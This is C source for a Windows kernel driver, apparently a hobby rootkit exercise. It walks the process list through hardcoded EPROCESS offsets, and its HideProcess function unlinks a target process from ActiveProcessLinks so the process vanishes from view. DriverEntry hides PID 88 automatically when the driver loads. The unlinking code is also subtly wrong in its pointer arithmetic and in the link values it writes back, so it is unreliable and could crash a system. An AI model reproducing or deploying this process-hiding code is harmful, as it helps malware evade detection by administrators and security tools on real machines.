#include <ntddk.h>

#define ListEntryOffset 0x2e8
#define PidOffset 0x2e0
#define NameOffset 0x450
#define ThreadListOffset 0x488

VOID PrintToDebugger()
{
	DbgPrint("Hello from the kernel :)\nWith great power comes great responsibility!\n");
}

VOID PrintAllProcesses()
{
	UCHAR name[15];
	PEPROCESS p = PsGetCurrentProcess();
	HANDLE sys_pid = PsGetProcessId(p);
	HANDLE pid = PsGetProcessId(p);
	LIST_ENTRY process_flink;

	do {
		memcpy(name, ((char*)p + NameOffset), 15); // ImageFileName

		memcpy(&process_flink, ((char*)p + ListEntryOffset), sizeof(LIST_ENTRY)); // ActiveProcessLinks

		p = (PEPROCESS)((char*)process_flink.Flink - (char*)ListEntryOffset); // next process
		
		DbgPrint("Name: %s, PID: %d\n", name, pid);

		pid = PsGetProcessId(p);

	} while (pid != sys_pid);
}

VOID HideProcess(DWORD32 pid)
{
	UCHAR name[15];
	PEPROCESS p = PsGetCurrentProcess();
	HANDLE currentPID = PsGetProcessId(p);
	LIST_ENTRY process_flink;

	do {
		memcpy(name, ((char*)p + NameOffset), 15); // ImageFileName
		memcpy(&process_flink, ((char*)p + ListEntryOffset), sizeof(LIST_ENTRY)); // ActiveProcessLinks
		p = (PEPROCESS)((char*)process_flink.Flink - (char*)ListEntryOffset); // next process
		currentPID = PsGetProcessId(p);
	} while ((int*)pid != currentPID && currentPID > 0);

	if (currentPID < 0)
	{
		DbgPrint("Could not find process with PID %d", pid);
		return;
	}

	memcpy(&process_flink, ((char*)p + ListEntryOffset), sizeof(LIST_ENTRY));
	PEPROCESS next_p = (PEPROCESS)((char*)process_flink.Flink - (char*)ListEntryOffset);

	memcpy(&process_flink, ((char*)p + ListEntryOffset + 0x8), sizeof(LIST_ENTRY));
	PEPROCESS prev_p = (PEPROCESS)((char*)process_flink.Flink - (char*)ListEntryOffset);

	char* prev_p_flink = (char*)prev_p + ListEntryOffset;
	DbgPrint("%p\n", prev_p_flink);
	memcpy(prev_p_flink, (char*)next_p + ListEntryOffset, sizeof(LIST_ENTRY));
	DbgPrint("%p\n", prev_p_flink);
	memcpy((char*)next_p + ListEntryOffset + 0x8, prev_p_flink, sizeof(LIST_ENTRY));
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = DriverUnload;

	UNICODE_STRING dev_name = RTL_CONSTANT_STRING(L"\\Device\\CoolDev");
	
	PDEVICE_OBJECT device_object;
	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&dev_name,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&device_object
	);

	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create device object (0x%08X)\n", status);
		return status;
	}

	//PrintToDebugger();
	//PrintAllProcesses();
	HideProcess(88);

	return STATUS_SUCCESS;
}